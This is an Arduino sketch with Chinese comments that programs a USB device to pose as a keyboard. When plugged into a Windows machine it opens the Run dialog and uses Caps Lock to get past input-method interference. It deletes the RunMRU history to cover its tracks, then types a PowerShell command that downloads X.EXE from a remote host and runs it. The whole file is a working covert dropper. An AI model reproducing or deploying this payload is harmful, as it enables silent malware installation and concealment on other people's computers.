void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//按下win键 
  delay(500); 
  Keyboard.press('r');//按下r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);//释放win键 
  Keyboard.release('r');//释放r键 
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD /C START /MIN REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN POWERSHELL $P = nEW-oBJECT sYSTEM.nET.wEBcLIENT;$P.dOWNLOADfILE('HTTP://192.168.1.103/X.EXE', 'c:\\X.EXE');START c:\\X.EXE;EXIT");
  Keyboard.press(KEY_CAPS_LOCK);//按下大写
  Keyboard.release(KEY_CAPS_LOCK);//整个过程关闭大写锁定
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
